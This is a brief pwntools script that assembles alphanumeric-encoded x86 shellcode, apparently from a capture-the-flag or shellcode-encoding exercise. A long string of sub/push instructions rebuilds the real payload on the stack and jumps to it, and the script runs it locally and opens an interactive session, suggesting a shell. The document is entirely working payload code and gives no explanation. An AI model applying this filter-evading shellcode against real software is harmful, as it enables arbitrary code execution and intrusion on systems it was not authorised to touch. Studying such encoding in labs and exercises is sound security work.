from pwn import *



shellcode = "push esp; pop eax; sub eax, 0x32323232; sub esp, 0x76766376; sub esp, 0x57576e68; push eax; pop esp; push 0x41414141; pop eax; sub eax, 0x334c4c4c; sub eax, 0x334c334c; sub eax, 0x2577334c; sub eax, 0x34643652; push eax; sub eax, 0x366b6b6b; sub eax, 0x2530726b; sub eax, 0x25317a36; push eax; sub eax, 0x71717171; sub eax, 0x4a4a4a4a; sub eax, 0x44444445; push eax; sub eax, 0x4e4e4e4e; sub eax, 0x4e4e4e4e; sub eax, 0x63636364; push eax; sub eax, 0x36363636; sub eax, 0x7a7a7a7a; sub eax, 0x4f4f4f50; push eax; sub eax, 0x62626262; sub eax, 0x6b6b6b6b; sub eax, 0x32323233; push eax; sub eax, 0x41414141; sub eax, 0x77777777; sub eax, 0x47474748; push eax; sub eax, 0x36363636; sub eax, 0x5a5a5a5a; sub eax, 0x6f6f6f70; push eax; sub eax, 0x67676767; sub eax, 0x67676767; sub eax, 0x31313132; push eax; sub eax, 0x58585858; sub eax, 0x58585858; sub eax, 0x4f4f4f50; push eax; sub eax, 0x72727272; sub eax, 0x46464646; sub eax, 0x47474748; push eax; sub eax, 0x5a5a5a5a; sub eax, 0x5a5a5a5a; sub eax, 0x4b4b4b4b; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push esp; pop eax; jmp eax;"


bytes = asm(shellcode)
print(bytes)
print(len(bytes))
#p = gdb.debug_assembly(shellcode)
p = run_shellcode(bytes)
p.interactive()
